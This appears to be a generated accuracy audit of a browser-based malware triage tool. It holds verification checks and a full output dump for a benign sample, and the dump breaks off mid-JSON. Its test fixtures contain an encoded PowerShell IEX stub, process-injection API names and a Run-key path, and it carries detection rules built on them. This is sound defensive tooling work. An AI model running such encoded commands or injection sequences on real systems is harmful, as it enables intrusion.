# Analyzer Accuracy Audit

Generated locally by `scripts/analyzer-accuracy-audit.mjs`.

## Classification Table
| Output Type | Classification (A/B/C/D) | File/Function | Status |
| --- | --- | --- | --- |
| Static metadata | B - PARTIALLY REAL | `public/assets/js/app.js` `runAnalysisPipeline()`, `renderStatic()`; `public/assets/js/advanced-analysis.js` `parsePE()` | Documented as limitation |
| Strings extraction | A - REAL | `public/assets/js/utils.js` `extractPrintableStrings()`, `classifyStrings()`; `public/assets/js/advanced-analysis.js` `buildStringsIntelligence()` | Fixed |
| Suspicious API detection | B - PARTIALLY REAL | `public/assets/js/advanced-analysis.js` `parsePE()`, `buildApiRisk()` | Documented as limitation |
| IOC extraction | A - REAL | `public/assets/js/utils.js` `extractIOCs()`; `public/assets/js/advanced-analysis.js` `buildIOCActionability()` | Fixed |
| MITRE ATT&CK mapping | B - PARTIALLY REAL | `public/assets/js/app.js` `runAnalysisPipeline()`; `public/assets/js/advanced-analysis.js` `buildAttackTable()` | Documented as limitation |
| YARA draft generation | B - PARTIALLY REAL | `public/assets/js/advanced-analysis.js` `generateDraftYara()` | Documented as limitation |
| Sigma draft generation | B - PARTIALLY REAL | `public/assets/js/advanced-analysis.js` `generateDraftSigma()` | Fixed |
| Threat hunting query generation | B - PARTIALLY REAL | `public/assets/js/app.js` `buildHuntingQueries()`; `public/assets/js/advanced-analysis.js` `buildDetectionEngineering()` | Documented as limitation |
| Analyst report export | B - PARTIALLY REAL | `public/assets/js/app.js` `generateAnalystReport()`, `exportMarkdown()`, `exportJSON()`, `exportIOCCSV()`, `exportBlocklist()`, `exportYARA()`, `exportSigma()` | Documented as limitation |

## Source Trace and Data Flow
### Static metadata
Input comes from `FileReader` in `handleFile()`, is stored in `fileContent`, then hashed with local SHA/MD5 helpers, entropy is computed with `shannonEntropy(input)`, and PE structure is parsed by `parsePE(input)`. `parsePE()` reads MZ/PE headers, section table fields, entropy per section, import/export tables when parsable, and scans actual bytes for suspicious API strings.

### Strings extraction
Input is scanned with printable ASCII extraction (`extractPrintableStrings()` and `buildStringsIntelligence()`), then categorized by regex. This now works for text and binary blobs represented as browser byte strings.

### Suspicious API detection
`parsePE()` collects actual parsed imports when the PE import table can be read and scans the full input for known API names. `buildApiRisk()` marks each API as `real import` or `string only`.

### IOC extraction
`extractIOCs(input)` uses local regexes for IPs, URLs, defanged URLs/domains, hashes, emails, registry keys, paths, BTC/CVE values, and mutexes. `buildIOCActionability()` separates private/reserved/demo indicators from actionable blocklist candidates.

### MITRE ATT&CK mapping
`BEHAVIOR_RULES` regexes match the input and carry technique IDs. `buildAttackTable()` turns matched behavior evidence into tactic/technique/confidence rows and adds IOC/static-context T1071 when network indicators are present.

### YARA draft generation
`generateDraftYara()` selects actual matched behavior labels, suspicious APIs, registry paths, file paths, mutexes, URLs, domains, and high-signal strings, then emits a draft YARA rule around those strings.

### Sigma draft generation
`generateDraftSigma()` matches local Sigma pattern regexes, then includes exact extracted registry/URL/domain/path values and matched command lines in `CommandLine|contains` terms.

### Threat hunting query generation
`buildHuntingQueries()` takes extracted IOCs plus suspicious command lines and substitutes them into Splunk, Defender KQL, and Elastic templates. `buildDetectionEngineering()` also carries blocklists and hash hunt suggestions.

### Analyst report export
`generateAnalystReport()` and export functions serialize the computed local analysis state into Markdown, JSON, IOC CSV, blocklist, YARA, and Sigma client-side blobs.

## Documented Limitations
### Static metadata
Hashes, entropy, byte/line counts, and lightweight PE parsing are real. Full file-type identification, rich PE import recovery, resource parsing, certificates, rich headers, overlay classification, and archive/document parsers are not implemented. Making this fully real would require a broader client-side parser set and significant engineering, but no paid API.

### Suspicious API detection
API detection is real for parsed imports and literal API strings, but it cannot recover dynamically resolved imports, packed code, obfuscated names, or shellcode imports. Fully fixing this would require deeper binary parsing/unpacking/emulation, which is large and outside a browser-only quick fix.

### MITRE ATT&CK mapping
Mappings are rule-based from actual matched static evidence. They are not behavioral telemetry and cannot prove runtime execution or tactic intent. Fully real ATT&CK mapping would require dynamic sandbox/EDR telemetry or extensive local emulation, which is intentionally not added.

### YARA draft generation
The draft contains real strings from the sample, but the rule shell, metadata, and condition are templated and require analyst tuning. A production-quality YARA generator would require string scoring, false-positive testing, and corpus validation.

### Threat hunting query generation
Queries include actual IOCs/commands, but field choices and indexes are generic templates. Fully real customer-ready hunts require environment-specific schemas, data sources, and validation against SIEM/EDR telemetry.

### Analyst report export
Exports serialize real computed analyzer outputs, but narrative sections and recommendations are templated. A fully real incident report requires case context, host telemetry, dynamic analysis, and analyst conclusions.

## Verification Checks
- PASS: sample1 IPs exact (192.0.2.1, 198.51.100.23)
- PASS: sample1 domain exact (example-malicious-test.com)
- PASS: sample1 registry exact (HKCU\Software\TestKey\Run)
- PASS: sample1 hash exact (abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789)
- PASS: sample1 YARA references actual sample string (checked YARA strings)
- PASS: sample1 Sigma references command or registry pattern (checked Sigma terms)
- PASS: sample2 base64 decoded (Write-Output "AuditSample2"; whoami /all)
- PASS: sample2 PowerShell MITRE (T1027.010, T1059.001, T1105, T1547.001, T1027, T1071)
- PASS: sample3 entropy from byte content (5.842)
- PASS: sample3 embedded strings extracted (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)r | MZ_AUDIT_SAMPLE_NOT_A_REAL_PE | VirtualAllocEx | WriteProcessMemory | CreateRemoteThread | http://example-malicious-test.com/bin | HKCU\Software\BinarySample\Run | powershell -enc SQBFAFgA | 0000000000000000000000000000000000000000000000000000000000000000)

## Full Output Dumps
# sample1.txt

## 1. Static Metadata
```json
{
  "byteLength": 369,
  "lines": 8,
  "entropy": 5.272684219294524,
  "peTriage": {
    "detected": false,
    "hasMZ": false,
    "hasPE": false,
    "fileType": "No PE structure detected",
    "architecture": "Not available",
    "timestamp": null,
    "subsystem": null,
    "dllCharacteristics": [],
    "imageBase": null,
    "entryPointRva": null,
    "sections": [],
    "imports": [],
    "importDlls": [],
    "exports": [],
    "suspiciousApiStrings": [],
    "packedIndicators": [],
    "warnings": [],
    "realImportTableParsed": false,
    "packerHints": []
  }
}
```

## 2. Strings Extraction
### Printable Strings
```text
ThreatRecon audit sample 1 - benign static IOC test.
Documentation IPs: 192.0.2.1 and 198.51.100.23
Domain: example-malicious-test.com
Registry: HKCU\Software\TestKey\Run
Command: powershell -enc SQBFAFgA
SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789
Suspicious string marker: Invoke-Expression is not executed in this text sample.
```
### Classified Strings
```json
[
  {
    "type": "crypto",
    "val": "SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
  }
]
```
### Strings Intelligence
```json
[
  {
    "name": "URLs and domains",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "Domain: example-malicious-test.com"
    ]
  },
  {
    "name": "IPs",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "Documentation IPs: 192.0.2.1 and 198.51.100.23"
    ]
  },
  {
    "name": "PowerShell strings",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "Command: powershell -enc SQBFAFgA",
      "Suspicious string marker: Invoke-Expression is not executed in this text sample."
    ]
  },
  {
    "name": "Crypto strings",
    "confidence": "Medium",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
    ]
  },
  {
    "name": "Suspicious commands",
    "confidence": "High",
    "explanation": "Static string category. Analyst validation required.",
    "items": [
      "Command: powershell -enc SQBFAFgA"
    ]
  }
]
```

## 3. Suspicious API Detection
```json
{
  "suspiciousApiStrings": [],
  "apiRisk": []
}
```

## 4. IOC Extraction
```json
{
  "iocs": {
    "ips": [
      "198.51.100.23"
    ],
    "localIndicators": [
      "192.0.2.1"
    ],
    "urls": [],
    "domains": [
      "example-malicious-test.com"
    ],
    "onion": [],
    "md5": [],
    "sha1": [],
    "sha256": [
      "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
    ],
    "emails": [],
    "registry": [
      "HKCU\\Software\\TestKey\\Run"
    ],
    "paths": [],
    "btc": [],
    "cve": [],
    "mutex": []
  },
  "actionability": [
    {
      "type": "ip",
      "value": "198.51.100.23",
      "confidence": "High",
      "actionable": false,
      "reason": "Reserved documentation IP range; training/demo indicator only.",
      "recommendedAction": "Keep for report context; do not block."
    },
    {
      "type": "local_ip",
      "value": "192.0.2.1",
      "confidence": "High",
      "actionable": false,
      "reason": "Local/private/special IP is local context only.",
      "recommendedAction": "Use for host triage, not network blocklists."
    },
    {
      "type": "domain",
      "value": "example-malicious-test.com",
      "confidence": "Medium",
      "actionable": true,
      "reason": "Domain indicator requiring validation.",
      "recommendedAction": "Validate reputation and consider DNS/proxy/URL block only if confirmed malicious."
    },
    {
      "type": "registry_key",
      "value": "HKCU\\Software\\TestKey\\Run",
      "confidence": "High",
      "actionable": false,
      "reason": "Registry path is a host hunt indicator",
      "recommendedAction": "Hunt endpoint telemetry and autoruns."
    },
    {
      "type": "hash",
      "value": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "confidence": "High",
      "actionable": true,
      "reason": "Hash indicator",
      "recommendedAction": "Use for EDR hash hunts; block only after validation."
    }
  ],
  "threatIntelPivots": [
    {
      "ioc": "example-malicious-test.com",
      "normalizedValue": "example-malicious-test.com",
      "type": "domain",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/example-malicious-test.com",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Domain indicator requiring validation."
    },
    {
      "ioc": "example-malicious-test.com",
      "normalizedValue": "example-malicious-test.com",
      "type": "domain",
      "actionable": true,
      "provider": "URLhaus",
      "url": "https://urlhaus.abuse.ch/browse.php?search=example-malicious-test.com",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Domain indicator requiring validation."
    },
    {
      "ioc": "example-malicious-test.com",
      "normalizedValue": "example-malicious-test.com",
      "type": "domain",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=example-malicious-test.com",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Domain indicator requiring validation."
    },
    {
      "ioc": "example-malicious-test.com",
      "normalizedValue": "example-malicious-test.com",
      "type": "domain",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/domain/example-malicious-test.com",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Domain indicator requiring validation."
    },
    {
      "ioc": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "normalizedValue": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "type": "sha256",
      "actionable": true,
      "provider": "VirusTotal",
      "url": "https://www.virustotal.com/gui/search/abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "normalizedValue": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "type": "sha256",
      "actionable": true,
      "provider": "MalwareBazaar",
      "url": "https://bazaar.abuse.ch/browse.php?search=sha256%3Aabcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "normalizedValue": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "type": "sha256",
      "actionable": true,
      "provider": "ThreatFox",
      "url": "https://threatfox.abuse.ch/browse.php?search=abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    },
    {
      "ioc": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "normalizedValue": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "type": "sha256",
      "actionable": true,
      "provider": "AlienVault OTX",
      "url": "https://otx.alienvault.com/indicator/file/abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "note": "Manual pivot only. ThreatRecon does not automatically submit samples or IOCs.",
      "reason": "Hash indicator"
    }
  ],
  "skippedThreatIntelPivots": [
    {
      "ioc": "198.51.100.23",
      "normalizedValue": "198.51.100.23",
      "type": "ip",
      "actionable": false,
      "reason": "Skipped: documentation IP range",
      "category": "documentation-ip"
    },
    {
      "ioc": "192.0.2.1",
      "normalizedValue": "192.0.2.1",
      "type": "ip",
      "actionable": false,
      "reason": "Skipped: documentation IP range",
      "category": "documentation-ip"
    },
    {
      "ioc": "HKCU\\Software\\TestKey\\Run",
      "normalizedValue": "HKCU\\Software\\TestKey\\Run",
      "type": "registry_key",
      "actionable": false,
      "reason": "Skipped: not suitable for reputation pivot",
      "category": "not-suitable"
    }
  ]
}
```

## 5. MITRE ATT&CK Mapping
```json
{
  "mitre": [
    "T1027.010",
    "T1059.001",
    "T1071"
  ],
  "attackTable": [
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027.010",
      "techniqueName": "Command Obfuscation",
      "observedEvidence": "Encoded PowerShell command — obfuscated payload delivery",
      "confidence": "High",
      "detectionIdea": "Hunt for evidence containing \"Encoded PowerShell command — obfuscated payload delivery\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Execution",
      "techniqueId": "T1059.001",
      "techniqueName": "PowerShell",
      "observedEvidence": "IEX / Invoke-Expression — dynamic code execution",
      "confidence": "High",
      "detectionIdea": "Monitor PowerShell command line arguments, encoded commands, hidden windows, and suspicious parents."
    },
    {
      "tactic": "Command and Control",
      "techniqueId": "T1071",
      "techniqueName": "Application Layer Protocol",
      "observedEvidence": "Technique inferred from IOC or static context",
      "confidence": "Medium",
      "detectionIdea": "Hunt for command lines or processes contacting extracted network IOCs."
    }
  ],
  "attackTimeline": [
    {
      "stage": "Execution",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery"
      ],
      "confidence": "Medium",
      "technique": "T1027.010",
      "validation": "Review process creation and script block logs."
    },
    {
      "stage": "Defense Evasion",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery"
      ],
      "confidence": "Medium",
      "technique": "T1027.010",
      "validation": "Check security control tampering and obfuscation telemetry."
    }
  ]
}
```

## 6. YARA Draft Rule
```yara
rule ThreatRecon_Suspicious_Script {
  meta:
    description = "Draft rule generated from local static triage"
    author = "ThreatRecon"
    source = "Local browser analysis"
    confidence = "medium"
  strings:
    $s1 = "Encoded PowerShell command — obfuscated payload delivery" nocase // behavior
    $s2 = "IEX / Invoke-Expression — dynamic code execution" nocase // behavior
    $s3 = "HKCU\\Software\\TestKey\\Run" nocase // artifact
    $s4 = "example-malicious-test.com" nocase // network
    $s5 = "Domain: example-malicious-test.com" nocase // URLs and domains
    $s6 = "Documentation IPs: 192.0.2.1 and 198.51.100.23" nocase // IPs
    $s7 = "Command: powershell -enc SQBFAFgA" nocase // PowerShell strings
    $s8 = "Suspicious string marker: Invoke-Expression is not executed in this text sample." nocase // PowerShell strings
    $s9 = "SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789" nocase // Crypto strings
  condition:
    3 of them
}
```

## 7. Sigma Draft Rule
```yaml
title: ThreatRecon Encoded PowerShell
id: 00000000-0000-4000-8000-000000000000
status: experimental
description: Draft Sigma rule generated from local static triage. Analyst review required before production use.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "powershell"
      - "-enc"
      - "HKCU\\Software\\TestKey\\Run"
      - "example-malicious-test.com"
      - "Command: powershell -enc SQBFAFgA"
  condition: selection
falsepositives:
  - Administrative scripts
  - Security testing
level: high
tags:
  - attack.t1059_001
  - attack.t1027_010
  - attack.t1071
```

## 8. Threat Hunting Output
```json
{
  "huntingQueries": [
    {
      "value": "198.51.100.23",
      "splunk": "index=* \"198.51.100.23\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"198.51.100.23\"",
      "elastic": "process.command_line : \"*198.51.100.23*\""
    },
    {
      "value": "example-malicious-test.com",
      "splunk": "index=* \"example-malicious-test.com\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"example-malicious-test.com\"",
      "elastic": "process.command_line : \"*example-malicious-test.com*\""
    },
    {
      "value": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "splunk": "index=* \"abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"",
      "elastic": "process.command_line : \"*abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789*\""
    },
    {
      "value": "Command: powershell -enc SQBFAFgA",
      "splunk": "index=* \"Command: powershell -enc SQBFAFgA\"",
      "defender": "DeviceProcessEvents\n| where ProcessCommandLine contains \"Command: powershell -enc SQBFAFgA\"",
      "elastic": "process.command_line : \"*Command: powershell -enc SQBFAFgA*\""
    }
  ],
  "detectionEngineering": {
    "draftSigma": "title: ThreatRecon Encoded PowerShell\nid: 00000000-0000-4000-8000-000000000000\nstatus: experimental\ndescription: Draft Sigma rule generated from local static triage. Analyst review required before production use.\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"powershell\"\n      - \"-enc\"\n      - \"HKCU\\\\Software\\\\TestKey\\\\Run\"\n      - \"example-malicious-test.com\"\n      - \"Command: powershell -enc SQBFAFgA\"\n  condition: selection\nfalsepositives:\n  - Administrative scripts\n  - Security testing\nlevel: high\ntags:\n  - attack.t1059_001\n  - attack.t1027_010\n  - attack.t1071",
    "draftYara": "rule ThreatRecon_Suspicious_Script {\n  meta:\n    description = \"Draft rule generated from local static triage\"\n    author = \"ThreatRecon\"\n    source = \"Local browser analysis\"\n    confidence = \"medium\"\n  strings:\n    $s1 = \"Encoded PowerShell command — obfuscated payload delivery\" nocase // behavior\n    $s2 = \"IEX / Invoke-Expression — dynamic code execution\" nocase // behavior\n    $s3 = \"HKCU\\\\Software\\\\TestKey\\\\Run\" nocase // artifact\n    $s4 = \"example-malicious-test.com\" nocase // network\n    $s5 = \"Domain: example-malicious-test.com\" nocase // URLs and domains\n    $s6 = \"Documentation IPs: 192.0.2.1 and 198.51.100.23\" nocase // IPs\n    $s7 = \"Command: powershell -enc SQBFAFgA\" nocase // PowerShell strings\n    $s8 = \"Suspicious string marker: Invoke-Expression is not executed in this text sample.\" nocase // PowerShell strings\n    $s9 = \"SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\" nocase // Crypto strings\n  condition:\n    3 of them\n}",
    "splunk": [
      "index=* \"198.51.100.23\"",
      "index=* \"example-malicious-test.com\"",
      "index=* \"abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"",
      "index=* \"Command: powershell -enc SQBFAFgA\""
    ],
    "defender": [
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"198.51.100.23\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"example-malicious-test.com\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789\"",
      "DeviceProcessEvents\n| where ProcessCommandLine contains \"Command: powershell -enc SQBFAFgA\""
    ],
    "elastic": [
      "process.command_line : \"*198.51.100.23*\"",
      "process.command_line : \"*example-malicious-test.com*\"",
      "process.command_line : \"*abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789*\"",
      "process.command_line : \"*Command: powershell -enc SQBFAFgA*\""
    ],
    "firewallBlocklist": [
      "example-malicious-test.com",
      "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
    ],
    "dnsBlocklist": [
      "example-malicious-test.com"
    ],
    "edrHashHunts": [
      "Search endpoint file/process telemetry for hash abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
    ]
  }
}
```

## 9. Analyst Report Exports
### Markdown
```markdown
# ThreatRecon Triage Report - sample1.txt

## Static Metadata
- Byte length: 369
- MD5: 246accd4fd805ca9eff774cd09d9f1fd
- SHA-1: 8318d042fa8c25b221ec685fce29a209a8e26cc8
- SHA-256: cea3985ff1fd52bd492c9239ddfec6d8f10e4a2f81744b50b6871aa9b9c3f727
- Entropy: 5.273 bits/byte
- PE type: No PE structure detected
- PE imports: none parsed
- Suspicious API strings: none

## IOCs
### ips
198.51.100.23

### localIndicators
192.0.2.1

### domains
example-malicious-test.com

### sha256
abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789

### registry
HKCU\Software\TestKey\Run

## MITRE ATT&CK
- Defense Evasion | T1027.010 Command Obfuscation | Evidence: Encoded PowerShell command — obfuscated payload delivery | Confidence: High
- Execution | T1059.001 PowerShell | Evidence: IEX / Invoke-Expression — dynamic code execution | Confidence: High
- Command and Control | T1071 Application Layer Protocol | Evidence: Technique inferred from IOC or static context | Confidence: Medium

## YARA Draft
`\`\`yara
rule ThreatRecon_Suspicious_Script {
  meta:
    description = "Draft rule generated from local static triage"
    author = "ThreatRecon"
    source = "Local browser analysis"
    confidence = "medium"
  strings:
    $s1 = "Encoded PowerShell command — obfuscated payload delivery" nocase // behavior
    $s2 = "IEX / Invoke-Expression — dynamic code execution" nocase // behavior
    $s3 = "HKCU\\Software\\TestKey\\Run" nocase // artifact
    $s4 = "example-malicious-test.com" nocase // network
    $s5 = "Domain: example-malicious-test.com" nocase // URLs and domains
    $s6 = "Documentation IPs: 192.0.2.1 and 198.51.100.23" nocase // IPs
    $s7 = "Command: powershell -enc SQBFAFgA" nocase // PowerShell strings
    $s8 = "Suspicious string marker: Invoke-Expression is not executed in this text sample." nocase // PowerShell strings
    $s9 = "SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789" nocase // Crypto strings
  condition:
    3 of them
}
`\`\`

## Sigma Draft
`\`\`yaml
title: ThreatRecon Encoded PowerShell
id: 00000000-0000-4000-8000-000000000000
status: experimental
description: Draft Sigma rule generated from local static triage. Analyst review required before production use.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - "powershell"
      - "-enc"
      - "HKCU\\Software\\TestKey\\Run"
      - "example-malicious-test.com"
      - "Command: powershell -enc SQBFAFgA"
  condition: selection
falsepositives:
  - Administrative scripts
  - Security testing
level: high
tags:
  - attack.t1059_001
  - attack.t1027_010
  - attack.t1071
`\`\`

## Hunting Queries
- 198.51.100.23
  - Splunk: index=* "198.51.100.23"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "198.51.100.23"
  - Elastic: process.command_line : "*198.51.100.23*"
- example-malicious-test.com
  - Splunk: index=* "example-malicious-test.com"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "example-malicious-test.com"
  - Elastic: process.command_line : "*example-malicious-test.com*"
- abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789
  - Splunk: index=* "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
  - Elastic: process.command_line : "*abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789*"
- Command: powershell -enc SQBFAFgA
  - Splunk: index=* "Command: powershell -enc SQBFAFgA"
  - Defender: DeviceProcessEvents | where ProcessCommandLine contains "Command: powershell -enc SQBFAFgA"
  - Elastic: process.command_line : "*Command: powershell -enc SQBFAFgA*"
```
### JSON
```json
{
  "sample": "sample1.txt",
  "byteLength": 369,
  "hashes": {
    "md5": "246accd4fd805ca9eff774cd09d9f1fd",
    "sha1": "8318d042fa8c25b221ec685fce29a209a8e26cc8",
    "sha256": "cea3985ff1fd52bd492c9239ddfec6d8f10e4a2f81744b50b6871aa9b9c3f727"
  },
  "entropy": 5.272684219294524,
  "score": 63,
  "scoreBreakdown": {
    "total": 63,
    "beh": 40,
    "iocScore": 11,
    "yaraScore": 0,
    "entScore": 3,
    "deobfScore": 0,
    "capScore": 9
  },
  "verdict": "HIGH THREAT",
  "staticMetadata": {
    "byteLength": 369,
    "lines": 8,
    "entropy": 5.272684219294524,
    "peTriage": {
      "detected": false,
      "hasMZ": false,
      "hasPE": false,
      "fileType": "No PE structure detected",
      "architecture": "Not available",
      "timestamp": null,
      "subsystem": null,
      "dllCharacteristics": [],
      "imageBase": null,
      "entryPointRva": null,
      "sections": [],
      "imports": [],
      "importDlls": [],
      "exports": [],
      "suspiciousApiStrings": [],
      "packedIndicators": [],
      "warnings": [],
      "realImportTableParsed": false,
      "packerHints": []
    }
  },
  "printableStrings": [
    "ThreatRecon audit sample 1 - benign static IOC test.",
    "Documentation IPs: 192.0.2.1 and 198.51.100.23",
    "Domain: example-malicious-test.com",
    "Registry: HKCU\\Software\\TestKey\\Run",
    "Command: powershell -enc SQBFAFgA",
    "SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
    "Suspicious string marker: Invoke-Expression is not executed in this text sample."
  ],
  "classifiedStrings": [
    {
      "type": "crypto",
      "val": "SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
    }
  ],
  "stringsIntelligence": [
    {
      "name": "URLs and domains",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "Domain: example-malicious-test.com"
      ]
    },
    {
      "name": "IPs",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "Documentation IPs: 192.0.2.1 and 198.51.100.23"
      ]
    },
    {
      "name": "PowerShell strings",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "Command: powershell -enc SQBFAFgA",
        "Suspicious string marker: Invoke-Expression is not executed in this text sample."
      ]
    },
    {
      "name": "Crypto strings",
      "confidence": "Medium",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "SHA256-lookalike: abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
      ]
    },
    {
      "name": "Suspicious commands",
      "confidence": "High",
      "explanation": "Static string category. Analyst validation required.",
      "items": [
        "Command: powershell -enc SQBFAFgA"
      ]
    }
  ],
  "suspiciousApiDetection": {
    "suspiciousApiStrings": [],
    "apiRisk": []
  },
  "iocs": {
    "ips": [
      "198.51.100.23"
    ],
    "localIndicators": [
      "192.0.2.1"
    ],
    "urls": [],
    "domains": [
      "example-malicious-test.com"
    ],
    "onion": [],
    "md5": [],
    "sha1": [],
    "sha256": [
      "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789"
    ],
    "emails": [],
    "registry": [
      "HKCU\\Software\\TestKey\\Run"
    ],
    "paths": [],
    "btc": [],
    "cve": [],
    "mutex": []
  },
  "iocActionability": [
    {
      "type": "ip",
      "value": "198.51.100.23",
      "confidence": "High",
      "actionable": false,
      "reason": "Reserved documentation IP range; training/demo indicator only.",
      "recommendedAction": "Keep for report context; do not block."
    },
    {
      "type": "local_ip",
      "value": "192.0.2.1",
      "confidence": "High",
      "actionable": false,
      "reason": "Local/private/special IP is local context only.",
      "recommendedAction": "Use for host triage, not network blocklists."
    },
    {
      "type": "domain",
      "value": "example-malicious-test.com",
      "confidence": "Medium",
      "actionable": true,
      "reason": "Domain indicator requiring validation.",
      "recommendedAction": "Validate reputation and consider DNS/proxy/URL block only if confirmed malicious."
    },
    {
      "type": "registry_key",
      "value": "HKCU\\Software\\TestKey\\Run",
      "confidence": "High",
      "actionable": false,
      "reason": "Registry path is a host hunt indicator",
      "recommendedAction": "Hunt endpoint telemetry and autoruns."
    },
    {
      "type": "hash",
      "value": "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
      "confidence": "High",
      "actionable": true,
      "reason": "Hash indicator",
      "recommendedAction": "Use for EDR hash hunts; block only after validation."
    }
  ],
  "mitre": [
    "T1027.010",
    "T1059.001",
    "T1071"
  ],
  "attackTable": [
    {
      "tactic": "Defense Evasion",
      "techniqueId": "T1027.010",
      "techniqueName": "Command Obfuscation",
      "observedEvidence": "Encoded PowerShell command — obfuscated payload delivery",
      "confidence": "High",
      "detectionIdea": "Hunt for evidence containing \"Encoded PowerShell command — obfuscated payload delivery\" in process, registry, and script telemetry."
    },
    {
      "tactic": "Execution",
      "techniqueId": "T1059.001",
      "techniqueName": "PowerShell",
      "observedEvidence": "IEX / Invoke-Expression — dynamic code execution",
      "confidence": "High",
      "detectionIdea": "Monitor PowerShell command line arguments, encoded commands, hidden windows, and suspicious parents."
    },
    {
      "tactic": "Command and Control",
      "techniqueId": "T1071",
      "techniqueName": "Application Layer Protocol",
      "observedEvidence": "Technique inferred from IOC or static context",
      "confidence": "Medium",
      "detectionIdea": "Hunt for command lines or processes contacting extracted network IOCs."
    }
  ],
  "attackTimeline": [
    {
      "stage": "Execution",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery"
      ],
      "confidence": "Medium",
      "technique": "T1027.010",
      "validation": "Review process creation and script block logs."
    },
    {
      "stage": "Defense Evasion",
      "evidence": [
        "Encoded PowerShell command — obfuscated payload delivery"
      ],
      "confidence": "Medium",
      "technique": "T1027.010",
      "validation": "Check security control tampering and obfuscation telemetry."
    }
  ],
  "yaraHits": [],
